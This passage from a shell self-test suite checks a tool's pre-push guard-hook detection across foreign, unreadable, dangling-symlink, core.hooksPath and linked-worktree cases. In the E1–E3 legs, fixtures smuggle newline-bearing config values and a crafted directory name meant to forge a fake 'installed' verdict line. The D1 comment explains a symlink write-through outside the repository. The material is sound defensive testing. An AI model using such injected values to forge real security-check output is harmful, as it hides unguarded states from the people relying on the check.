  [ -n "$d" ] || { echo "FAIL: K11/F1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"ok"*"foreign hook preserved"*) echo "PASS: K11/F1 a foreign hook is preserved and noted, not failed";; *) echo "FAIL: K11/F1 foreign hook not noted ($out)"; fail=1;; esac
  case "$out" in "Runtime guard:"*"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/F1 the check runs on a foreign hook and arms NO refusal";; *) echo "FAIL: K11/F1 the check either did not run or armed a refusal on a foreign hook ($out)"; fail=1;; esac

  # X1 — incepted, foreign hook that is NOT executable. git runs nothing on push, so "foreign hook
  # preserved" would imply a hook is in force that is not. Still non-failing (§4.3 — the kit does not
  # manage a foreign hook); the fix is honest wording, not a refusal.
  d=$(k11_fx incepted foreign-inert) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/X1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"not the kit's, and not executable — nothing runs on push"*) echo "PASS: K11/X1 a non-executable foreign hook is described honestly (nothing runs on push)";; *) echo "FAIL: K11/X1 a non-executable foreign hook was not honestly described ($out)"; fail=1;; esac
  case "$out" in "Runtime guard:"*"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/X1 a non-executable foreign hook still arms NO refusal (§4.3)";; *) echo "FAIL: K11/X1 the check either did not run or armed a refusal on a foreign hook (§4.3) ($out)"; fail=1;; esac

  # U1 — incepted, hook that DOES carry KIT_GUARD_CORE but cannot be READ. Before the fix this fell
  # through to the foreign branch (grep cannot tell "no marker" from "cannot read") and was affirmatively
  # mislabelled as a preserved brownfield hook while arming nothing — fail-open behind a reassuring
  # message, and a direct contradiction of design §8 ("absent, inert, or unreadable will refuse").
  if [ "$(id -u)" = "0" ]; then
    echo "SKIP: K11/U1 unreadable-hook leg — running as uid 0, where chmod 000 is not a read barrier (ci.yml runs conformance-core on ubuntu-latest as a non-root user, so CI does exercise it)"
  else
    d=$(k11_fx incepted unreadable) || d=""
    [ -n "$d" ] || { echo "FAIL: K11/U1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
    out=$(k11_run "$d") || out="<k11_run aborted>"
    chmod 700 "$d/.git/hooks/pre-push" 2>/dev/null || true; rm -rf "$d" 2>/dev/null || true
    case "$out" in *"MISS pre-push guard present but UNREADABLE"*) echo "PASS: K11/U1 an unreadable guard is reported UNREADABLE";; *) echo "FAIL: K11/U1 unreadable guard not reported as unreadable ($out)"; fail=1;; esac
    case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=unreadable"*) echo "PASS: K11/U1 an unreadable guard ARMS the refusal (design §8: absent, inert, OR unreadable)";; *) echo "FAIL: K11/U1 unreadable guard did not arm the refusal ($out)"; fail=1;; esac
    # Keys on "not the kit's", the phrase BOTH foreign wordings share — not on "foreign hook preserved"
    # alone. Measured: with the F8 wording in place, deleting the unreadable branch sends a chmod-000 KIT
    # hook down the foreign path and out as "…not the kit's, and not executable…", which the narrower
    # pattern let through. The claim under test is "the kit never says a KIT hook is not its own", so the
    # assertion must name that claim, not one sentence that happened to express it.
    case "$out" in
      "Runtime guard:"*"not the kit's"*) echo "FAIL: K11/U1 an unreadable KIT hook was MISLABELLED as a foreign hook ($out)"; fail=1;;
      "Runtime guard:"*) echo "PASS: K11/U1 an unreadable guard is NOT mislabelled as a foreign hook";;
      *) echo "FAIL: K11/U1 the guard section did not print at all on an unreadable hook ($out)"; fail=1;;
    esac
  fi

  # D1 (final fix-loop, finding X6) — a DANGLING SYMLINK at the destination is its own state, not
  # `absent`. `[ -f "$GUARD_HOOK" ]` FOLLOWS symlinks, so a dangling `.git/hooks/pre-push -> /elsewhere`
  # answered "absent" and the refusal then printed a `cp` that writes THROUGH the link and `chmod +x`s
  # the link's target. MEASURED (2026-07-21): pasting the emitted fix created an executable file at a
  # path outside the repository. The precondition is local write access to `.git/`, so this is hardening
  # rather than a live attack — but "absent" is the wrong ANSWER regardless, and `cp` is the wrong FIX.
  # THE NEGATIVE HALF IS LOAD-BEARING: `GUARD_STATE=absent` must NOT appear. Without it, an
  # implementation that merely reworded the MISS line while still classifying `absent` would pass —
  # and it is the STATE, not the wording, that selects the `cp` in the main-body refusal.
  d=$(k11_fx incepted dangling) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/D1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in
    *"GUARD_REFUSE=1 GUARD_STATE=absent"*)
      echo "FAIL: K11/D1 a DANGLING SYMLINK destination was classified 'absent' — the refusal's cp would write THROUGH the link to its target and chmod +x it ($out)"; fail=1 ;;
    *"DANGLING SYMLINK"*"GUARD_REFUSE=1 GUARD_STATE=dangling"*)
      echo "PASS: K11/D1 a dangling-symlink destination gets its own state, is reported as such, and still ARMS the refusal" ;;
    *) echo "FAIL: K11/D1 a dangling-symlink destination produced neither the 'absent' misclassification nor the dangling state ($out)"; fail=1 ;;
  esac

  # D2 — D1's sibling, and the SAME defect one path component up (security re-review, finding M-1). It
  # is not here: its claim is about the install COMMAND the main body emits, so it must run the whole
  # script through `k11_mp`, which is not defined until the MP block below. Grep `K11/D2`.

  # H1 — incepted, core.hooksPath set (husky/lefthook). That dir belongs to another tool, so the kit
  # neither installs into it nor passes judgment on it. Fail-safe: DISCLOSED SKIP, arming nothing.
  # The fixture has no pre-push hook in EITHER dir, so a check that ignored core.hooksPath would REFUSE
  # — cry-wolf on a legitimate brownfield repo. (Re-measured 2026-07-21: --git-path IS hooksPath-aware,
  # so without the skip the refusal now points at .husky/pre-push. That made the wolf louder, not
  # quieter: it names a file the kit has no business managing.)
  d=$(k11_fx incepted hookspath) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in "Runtime guard:"*"core.hooksPath is set to '.husky'"*"NOT judging .husky/pre-push"*) echo "PASS: K11/H1 a core.hooksPath repo gets a DISCLOSED SKIP naming the foreign hooks dir";; *) echo "FAIL: K11/H1 no disclosed core.hooksPath skip ($out)"; fail=1;; esac
  case "$out" in
    "Runtime guard:"*"MISS"*) echo "FAIL: K11/H1 cried wolf on a legitimate husky/lefthook brownfield repo ($out)"; fail=1;;
    "Runtime guard:"*"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/H1 the core.hooksPath skip arms NO refusal";;
    *) echo "FAIL: K11/H1 the guard section did not print on a core.hooksPath tree ($out)"; fail=1;;
  esac

  # H2 — incepted, core.hooksPath set to the NO-OP value .git/hooks. Some tooling writes exactly that;
  # it redirects nothing, so git runs the very file this check judges. Treating "the key is set" as "the
  # key redirects" silences the check on precisely the unguarded state K11 exists to catch — a
  # fail-OPEN hidden inside a fail-safe. This fixture installs NO hook, so "judged normally" and
  # "skipped" produce opposite verdicts (MISS+armed vs a skip line and nothing armed): the assertion
  # cannot be satisfied by the pre-M2 behaviour. Kill decision: reverting the guard to a bare
  # `if [ -n "$_hp" ]` must turn these two RED while H1 stays green.
  d=$(k11_fx incepted hookspath-noop) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in
    *"skip pre-push guard"*) echo "FAIL: K11/H2 a NO-OP core.hooksPath=.git/hooks was treated as a redirect and skipped — silent on an unguarded tree ($out)"; fail=1;;
    "Runtime guard:"*"MISS pre-push guard"*"not installed at"*) echo "PASS: K11/H2 a no-op core.hooksPath=.git/hooks is judged normally, not skipped";;
    *) echo "FAIL: K11/H2 a no-op core.hooksPath tree produced neither a skip nor a MISS ($out)"; fail=1;;
  esac
  case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/H2 a no-op core.hooksPath still ARMS the refusal for the absent guard";; *) echo "FAIL: K11/H2 a no-op core.hooksPath swallowed the absent-guard refusal ($out)"; fail=1;; esac

  # H3 — the SAME relative core.hooksPath=.git/hooks, judged from inside a LINKED WORKTREE. H2 alone
  # could not see this: a relative value was resolved against `--show-toplevel`, which in a linked
  # worktree is the WORKTREE root, where `.git` is a FILE — so `<wt>/.git/hooks` does not exist, the
  # resolution failed, and the UNRESOLVABLE => skip rule fired. Same config, opposite verdict:
  #   MAIN tree: MISS … / GUARD_REFUSE=1 absent      LINKED worktree: skip … / GUARD_REFUSE=0
  # i.e. a fail-OPEN nested inside the fail-safe, in the lane W1/W2 already carry two legs for. This
  # leg pins the two trees to the SAME verdict. Kill decision: removing the main-worktree retry in
  # guard_hookspath_is_noop must turn it RED while H1/H2 stay green (measured: it does, 2 FAILs, both
  # H3, 32 other legs untouched).
  # FALSE-POSITIVE DIRECTION MEASURED TOO, since this fix makes the check judge MORE: a real
  # `hooksPath = .husky` still SKIPS from a linked worktree in both shapes — `.husky` checked out in the
  # worktree, and `.husky` present only in the main tree. It cannot do otherwise by construction: the
  # retry can only reach the default hooks dir for a value that NAMES it (`<gitdirname>/hooks`), which
  # names no other tool. H1 remains the main-tree lock for that lane.
  d=$(k11_fx incepted hookspath-noop) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H3 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _h3wt="$d-wt"
  ( cd "$d" \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git add -A \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
       git -c commit.gpgsign=false -c user.email=k11@fixture.invalid -c user.name=k11 commit -qm "k11 hooksPath worktree fixture" \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git worktree add -q "$_h3wt" -b k11h3 ) >/dev/null 2>&1 || true
  if [ -d "$_h3wt" ]; then
    out=$(k11_run "$_h3wt") || out="<k11_run aborted>"
    case "$out" in
      *"skip pre-push guard"*) echo "FAIL: K11/H3 from a LINKED WORKTREE the relative core.hooksPath=.git/hooks took the disclosed skip — the same tree that is judged from the main worktree goes silent here (fail-open) ($out)"; fail=1;;
      "Runtime guard:"*"MISS pre-push guard"*"not installed at"*) echo "PASS: K11/H3 a relative core.hooksPath=.git/hooks is judged normally from a LINKED WORKTREE too, not skipped";;
      *) echo "FAIL: K11/H3 a core.hooksPath worktree produced neither a skip nor a MISS ($out)"; fail=1;;
    esac
    case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/H3 the linked worktree ARMS the refusal, matching the main tree's verdict on the identical config";; *) echo "FAIL: K11/H3 the linked worktree did not arm the refusal that the SAME config arms from the main tree ($out)"; fail=1;; esac
    ( cd "$d" && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
                 git worktree remove --force "$_h3wt" ) >/dev/null 2>&1 || true
  else
    echo "FAIL: K11/H3 could not build the core.hooksPath linked-worktree fixture (git worktree add failed) — the lane is left unasserted"; fail=1
  fi
  rm -rf "$d" "$_h3wt" 2>/dev/null || true

  # H4 (final fix-loop, finding Y1) — the NO-OP core.hooksPath when the DEFAULT HOOKS DIR DOES NOT EXIST.
  # H2 could not see this: its fixture has a `.git/hooks` (git init creates one), and the old resolution
  # required BOTH sides to exist. A repo created with an empty `--template` has no `.git/hooks`, so
  # `_hp_def` came back empty, guard_hookspath_is_noop answered "not a no-op", and the caller took the
  # DISCLOSED SKIP on a genuinely unguarded incepted tree — fail-open, and the exact inverse of design
  # §8 ("a value naming the repo's own default hooks dir is NOT skipped — it is judged normally").
  # SAME ASSERTION SHAPE AS H2 ON PURPOSE: the two fixtures differ in exactly one fact (does .git/hooks
  # exist), so a divergence between them is the finding and nothing else.
  # Kill decision: reverting either side of guard_hookspath_is_noop to the existence-DEPENDENT
  # `cd … && pwd -P` must turn this RED while H1/H2/H3 stay green.
  d=$(k11_fx incepted hookspath-noop-nodir) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H4 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in
    *"skip pre-push guard"*) echo "FAIL: K11/H4 a no-op core.hooksPath=.git/hooks was SKIPPED because the default hooks dir does not exist — silent on an unguarded incepted tree, the inverse of design §8 ($out)"; fail=1;;
    "Runtime guard:"*"MISS pre-push guard"*) echo "PASS: K11/H4 a no-op core.hooksPath is judged normally even when .git/hooks does not exist (both sides resolve existence-independently)";;
    *) echo "FAIL: K11/H4 the fixture produced neither a skip nor a MISS ($out)"; fail=1;;
  esac
  case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/H4 that judgment ARMS the refusal, so the unguarded tree is not merely mentioned";; *) echo "FAIL: K11/H4 the absent guard was reported but no refusal was armed ($out)"; fail=1;; esac

  # H5 (final fix-loop, finding X4) — core.hooksPath set OUTSIDE the repository. `git config --get`
  # reads local, global AND system scope, but the skip's wording was "this repo manages its own hooks"
  # — a claim about the REPO made from a value that may be one line in `~/.gitconfig` (common with
  # husky, lefthook and corporate setups). MEASURED (2026-07-21): a global-only core.hooksPath made this
  # check silent and green in an unguarded incepted repo, i.e. on EVERY repo on that machine at once.
  # This leg is the ONLY one that may unset the hermetic GIT_CONFIG_GLOBAL — deliberately, because the
  # global scope IS the thing under test. It points at a fixture file, never at the developer's real
  # ~/.gitconfig, so the run stays hermetic in every other respect.
  # THE NEGATIVE HALF IS LOAD-BEARING TWICE OVER: the reassuring per-repo wording must NOT appear (that
  # was the lie), and the section must not go silent either (silence was the effect).
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H5 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  printf '[core]\n\thooksPath = %s\n' "$d/elsewhere-hooks" > "$d/k11-global-gitconfig" 2>/dev/null || true
  mkdir -p "$d/elsewhere-hooks" 2>/dev/null || true
  out=$( cd "$d" 2>/dev/null && { GIT_CONFIG_GLOBAL="$d/k11-global-gitconfig" GIT_CONFIG_SYSTEM=/dev/null check_guard_installed || true
                                  printf 'GUARD_REFUSE=%s GUARD_STATE=%s\n' "${GUARD_REFUSE-unset}" "${GUARD_STATE-unset}"; } ) 2>&1 || out="<k11 H5 aborted>"
  rm -rf "$d" 2>/dev/null || true
  case "$out" in
    *"this repo manages its own hooks"*)
      echo "FAIL: K11/H5 a core.hooksPath that came from a GLOBAL config was reported as 'this repo manages its own hooks' — nothing in this repository asked for it, and the check went green on an unguarded tree ($out)"; fail=1 ;;
    "Runtime guard:"*"NOT IN FORCE"*"OUTSIDE this repository"*)
      echo "PASS: K11/H5 a non-local core.hooksPath is reported as a scope problem — the kit's guard is stated NOT IN FORCE, without the reassuring per-repo wording" ;;
    *) echo "FAIL: K11/H5 a global core.hooksPath produced neither the false per-repo reassurance nor the scope warning ($out)"; fail=1 ;;
  esac

  # E1 — the KILL DECISION for the printf-not-echo fix in the skip stanza. Without it that security fix
  # was assertion-free: reverting both `printf '%s\n'` calls to `echo` and running under a shell whose
  # echo honours backslash escapes forges a line into a security check's verdict (measured: 6 output
  # lines instead of 4) and every other leg stays green — exactly the "a green attests the test RAN,
  # never that the claim is true" hole this file's own doctrine forbids.
  # SHAPE, NOT WORDING: the stanza is pinned by LINE COUNT (header + 2 stanza lines + the k11_run
  # trailer = 4) and by the absence of the forged continuation line, so it survives a reword of the skip
  # text but not an injected line. The count is anchored to the skip having actually printed — a bare
  # "4 lines" is also what several broken implementations emit.
  # HONEST CEILING: whether the mutant dies is SHELL-DEPENDENT, because the bug is. `echo` expanding
  # `\n` is permitted-but-not-required by POSIX; it expands under dash (which IS /bin/sh on the
  # ubuntu-latest runner that executes ci.yml's `sh scripts/preflight.sh --selftest`) and under this
  # host's /bin/sh, and does not under a bash built without xpg_echo. The ASSERTION is shell-independent
  # and always runs; only the mutation kill needs a forging echo.
  d=$(k11_fx incepted hookspath-escape) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/E1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  _e1n=$(printf '%s\n' "$out" | wc -l | tr -d ' ')
  _e1f=$(printf '%s\n' "$out" | grep -c "^b'") || _e1f=0
  case "$out" in
    "Runtime guard:"*"skip pre-push guard"*)
      if [ "$_e1n" = 4 ]; then
        echo "PASS: K11/E1 a core.hooksPath carrying a literal backslash-n prints the skip stanza VERBATIM — 4 output lines, no line synthesised from the config value"
      else
        echo "FAIL: K11/E1 a hostile core.hooksPath forged extra lines into the guard's verdict ($_e1n output lines, expected 4) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/E1 the hostile core.hooksPath value did not produce the disclosed skip stanza at all ($out)"; fail=1 ;;
  esac
  if [ "$_e1f" = 0 ]; then
    echo "PASS: K11/E1 no output line was forged out of the config value (nothing begins with the injected continuation)"
  else
    echo "FAIL: K11/E1 $_e1f output line(s) were SYNTHESISED from the core.hooksPath value — the verdict is attacker-shapeable ($out)"; fail=1
  fi

  # E2/E3/E4 (final fix-loop, finding X3) — THE E1 FAMILY EXTENDED TO THE AXIS IT COULD NOT REACH.
  # E1's only fixture axis is the core.hooksPath VALUE. Both routes the security review reproduced are
  # PATH-derived, and E1 cannot see either of them by construction — which is why a `printf`-rule the
  # file had already written down survived unapplied at the one `echo` that carried a variable.

  # E2 — the PATH axis of E1's own bug: the repo root's NAME carries a literal backslash-n, which the
  # `echo` at the MISS line expanded into a forged `ok   pre-push guard installed and executable`
  # verdict. MEASURED under /bin/dash — which IS /bin/sh on the ubuntu-latest runner that runs this in
  # CI — before the fix. The forged text is chosen to be this check's OWN happy-path verdict, so a
  # regression does not merely add noise, it inverts the answer.
  # SHELL-DEPENDENT KILL, SHELL-INDEPENDENT ASSERTION, exactly as E1 records for its own mutant.
  d=$(k11_fx incepted none 'e\nok   pre-push guard installed and executable\n') || d=""
  [ -n "$d" ] || { echo "FAIL: K11/E2 fixture unbuildable (mktemp -d / rename failed) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  _e2f=$(printf '%s\n' "$out" | grep -c '^ok   pre-push guard installed') || _e2f=0
  case "$out" in
    "Runtime guard:"*"MISS pre-push guard"*)
      if [ "$_e2f" = 0 ]; then
        echo "PASS: K11/E2 a repo path containing a literal backslash-n cannot forge a verdict line — the MISS prints it verbatim (printf, not echo)"
      else
        echo "FAIL: K11/E2 $_e2f line(s) reading 'ok   pre-push guard installed…' were FORGED out of the repository's own directory name — the verdict is path-shapeable ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/E2 the backslash-n-named fixture did not reach the MISS line at all ($out)"; fail=1 ;;
  esac

  # E3 — E1's DISCLOSED RESIDUAL, closed. The T2 stanza recorded that a SINGLE-backslash config value
  # ("a\nb") is un-escaped by git into a REAL newline, which `printf '%s\n'` passes straight through,
  # and called it unfixable from there. It is fixable — just not by printf: rejecting control characters
  # before printing is what closes it, and it is the same parse-time rejection CP-7 Slice 2 used against
  # `--intent-owner` injection. FAIL-CLOSED, not silent: the check refuses, so an attacker cannot switch
  # it off by choosing a value.
  d=$(k11_fx incepted hookspath-nl) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/E3 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  _e3n=$(printf '%s\n' "$out" | wc -l | tr -d ' ')
  case "$out" in
    *"skip pre-push guard"*)
      echo "FAIL: K11/E3 a core.hooksPath containing a REAL newline was echoed into a disclosed skip — the value spans lines and the verdict is attacker-shapeable ($out)"; fail=1 ;;
    "Runtime guard:"*"CONTROL CHARACTER"*"GUARD_REFUSE=1 GUARD_STATE=hostile-path"*)
      if [ "$_e3n" = 3 ]; then
        echo "PASS: K11/E3 a core.hooksPath carrying a REAL newline is REFUSED without being echoed — 3 output lines, none synthesised (E1's disclosed residual is closed, not inherited)"
      else
        echo "FAIL: K11/E3 the control-character refusal fired but the output is $_e3n lines, not 3 — something still echoed the value ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/E3 a newline-bearing core.hooksPath produced neither the skip nor the control-character refusal ($out)"; fail=1 ;;
  esac

  # E4 completes this family but is a WHOLE-SCRIPT leg (it needs the main-body refusal, not just
  # check_guard_installed), so it lives below with MP10/MP11 — `k11_mp` is not defined until then.
  # Measured while writing it: calling k11_mp from here yields "command not found", the leg's own
  # `|| out="<k11_mp aborted>"` sentinel, and a loud FAIL. The sentinel worked; the placement is the fix.

  # W3 (design §4.5) — the reported path must be ABSOLUTE. `git rev-parse --git-path` answers relative
  # to the CWD (measured, git 2.48.1: from <repo>/a/b it yields ../../.git/hooks/pre-push), and the
  # refusal prints that value inside a `cp` command a human is told to PASTE. Pasted from anywhere but
  # preflight's own cwd, a relative path is a broken command — and no other leg can see this, because
  # every other leg runs from a fixture ROOT where the relative form is already correct-looking. This
  # leg runs the check from a SUBDIRECTORY and pins the exact physical path, so absoluteness AND
  # correctness are asserted together. Kill decision: deleting the absolutizing `case` must turn it RED.
  #
  # NOTE TO WHOEVER WRITES guard_tree_class: this leg ALSO requires that predicate to anchor its file
  # tests at the repo TOP-LEVEL (`git rev-parse --show-toplevel`), not at the cwd. Measured while
  # building this leg: a cwd-relative predicate such as `[ -f ENGINEERING-PRINCIPLES.md ]` returns
  # kit-source from every subdirectory, so the whole check goes SILENT there — the same fail-open class
  # as the inverted-fixture defect, reached by a different door. W3 is the only leg that can see it,
  # because every other leg runs from a fixture root where a cwd-relative test happens to be right.
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/W3 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _sp=$( CDPATH='' cd -- "$d" && pwd -P ) || _sp="$d"
  mkdir -p "$d/src/deep/nested" || true   # `|| true`: on the unbuildable-fixture path this mkdir MUST
                                          # fail (ENOTDIR under the sentinel), and an unguarded failure
                                          # under `set -e` would kill the run instead of the leg
  out=$(k11_run "$d/src/deep/nested") || out="<k11_run aborted>"
  rm -rf "$d" 2>/dev/null || true
  # THE DOUBLE QUOTES AROUND $_sp IN THE PATTERN BELOW ARE LOAD-BEARING — do not "simplify" them away.
  # A review round asked for them on the theory that a glob metacharacter in the mktemp path would be
  # honoured and a `*` would make this assertion vacuously true. RE-MEASURED (2026-07-21) in /bin/sh,
  # dash and bash, with _sp='/tmp/k11*evil' against an output naming a DIFFERENT path: an expansion
  # inside double quotes in a case pattern is LITERAL and does not match, while the same expansion
  # UNQUOTED does match and is vacuous. So the quoted form here (and at W2 below) is already sound and
  # needed no change — but only while the quotes stay. Same result for the `${out#*"…"}` idiom.
  case "$out" in *"not installed at $_sp/.git/hooks/pre-push"*) echo "PASS: K11/W3 run from a subdirectory, the reported hook path is ABSOLUTE and correct (paste-able per §4.5)";; *) echo "FAIL: K11/W3 from a subdirectory the reported path is not the absolute $_sp/.git/hooks/pre-push — a pasted 'cp … \$GUARD_HOOK' would be broken ($out)"; fail=1;; esac
  case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/W3 absolutizing the path does not break detection from a subdirectory";; *) echo "FAIL: K11/W3 the absent guard was not detected from a subdirectory ($out)"; fail=1;; esac

  # W1/W2 (design §4.4) — LINKED WORKTREE. §4.4 requires the `--git-path` form and NOT a hardcoded
  # .git/hooks/pre-push, but nothing asserted it: at review, substituting the hardcoded form left every
  # other leg green. Under `git worktree add` the two forms DISAGREE (measured, git 2.48.1): --git-path
  # yields the SHARED <main>/.git/hooks/pre-push because hooks live in the common dir, while the linked
  # worktree's own .git is a FILE — so the hardcoded form finds nothing and reports a FALSE MISS on a
  # correctly guarded tree. W1 kills the hardcoded form; W2 pins the path actually reported.
  d=$(k11_fx incepted installed) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/W1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _dp=$( CDPATH='' cd -- "$d" && pwd -P ) || _dp="$d"   # git records the PHYSICAL path in the worktree link
  _wt="$d-wt"
  ( cd "$d" \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git add -A \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
       git -c commit.gpgsign=false -c user.email=k11@fixture.invalid -c user.name=k11 commit -qm "k11 worktree fixture" \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git worktree add -q "$_wt" -b k11wt ) >/dev/null 2>&1 || true
  if [ -d "$_wt" ]; then
    out=$(k11_run "$_wt") || out="<k11_run aborted>"
    case "$out" in "Runtime guard:"*"ok   pre-push guard installed"*"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/W1 from inside a LINKED WORKTREE the shared installed guard is still found (the --git-path form; the hardcoded .git/hooks/ form would false-MISS here)";; *) echo "FAIL: K11/W1 linked worktree misclassified an installed shared guard — the hooks path is not being resolved with --git-path ($out)"; fail=1;; esac
    rm -f "$_dp/.git/hooks/pre-push"
    out=$(k11_run "$_wt") || out="<k11_run aborted>"
    # $_dp is double-quoted inside the pattern for the reason measured at W3 above — keep it that way.
    case "$out" in *"MISS pre-push guard"*"$_dp/.git/hooks/pre-push"*) echo "PASS: K11/W2 from the worktree the MISS names the SHARED main-tree hook path, not a worktree-local one";; *) echo "FAIL: K11/W2 the worktree MISS did not name the shared $_dp/.git/hooks/pre-push ($out)"; fail=1;; esac
    case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/W2 an absent shared guard ARMS the refusal from inside a linked worktree";; *) echo "FAIL: K11/W2 an absent shared guard did not arm the refusal from the worktree ($out)"; fail=1;; esac
    ( cd "$d" && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
                 git worktree remove --force "$_wt" ) >/dev/null 2>&1 || true
  else
    echo "FAIL: K11/W1 could not build the linked-worktree fixture (git worktree add failed) — design §4.4 is left unasserted"; fail=1
  fi
  rm -rf "$d" "$_wt" 2>/dev/null || true

  # A1 — ANTI-WOLF. A pre-inception kit-source tree has no guard obligation, so the check must be
  # entirely SILENT there: no section header, nothing armed. This leg also exercises k11_fx's kit-source
  # arm, which no other leg reaches — a typo there would otherwise ship unnoticed (S2 checks its shape;
  # this checks the behaviour). Honest ceiling: an anti-wolf assertion is satisfied by silence, so it was
  # VACUOUSLY green while guard_tree_class's body was `:` — the T1 slice's deliberate red state, ended
  # when the owner wrote the predicate (T2 fix-loop, finding J6: the old wording was in the present
  # tense and had stopped being true). It is now load-bearing, and it is the only thing standing between
  # a too-broad predicate and a gate the owner learns to ignore (doctor.sh:18). Design §6 records why a
  # mutation sweep can never find this.
  d=$(k11_fx kit-source none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/A1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"Runtime guard:"*) echo "FAIL: K11/A1 the check CRIED WOLF on a pre-inception kit-source tree ($out)"; fail=1;; *) echo "PASS: K11/A1 a kit-source tree gets no guard section at all (anti-wolf)";; esac
  case "$out" in *"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/A1 a kit-source tree arms NO refusal";; *) echo "FAIL: K11/A1 a kit-source tree armed a refusal ($out)"; fail=1;; esac

  # — MP1..MP5 (T2): THE WIRING, not the function ————————————————————————————————————————
  # Every leg above calls check_guard_installed DIRECTLY, so not one of them can see whether a real run
  # ever REACHES it — and until T2 it did not. Measured on the T1 tree (2026-07-21): an incepted-shaped
  # fixture with no installed hook ran the whole script and printed "All prerequisites present.", exit 0.
  # The detection was correct, complete, locked by 34 assertions, and DEAD. That is this file's own
  # recurring failure — "a defined-but-unacted-on check is decorative (the exact class that shipped twice
  # in this repo)" — restated one function over.
  #
  # So every MP leg drives the WHOLE SCRIPT (`sh "$K11_ROOT/scripts/preflight.sh"` with cwd = a fixture).
  # A direct call cannot see a missing call site, and it cannot see the refusal's `exit 1` either.
  #
  # EXIT CODES ARE ASSERTED WITH A DISCRIMINATING MESSAGE, never bare: preflight exits 1 for a missing
  # required tool and 2 for bad usage, so `rc = 1` alone passes for the wrong reason (the --raw scar).
  # MP3/MP4 invert that problem — they assert exit 0, which folds in the AMBIENT environment (a missing
  # jq reddens them for a reason that has nothing to do with this check; a false-RED generator is the
  # same defect class as a vacuous green, inverted). They therefore assert the rc DIFFERENTIALLY against
  # a baseline run in a directory that has no guard obligation at all, and assert the anti-wolf claim
  # itself — the absence of a `Runtime guard:` section — absolutely.
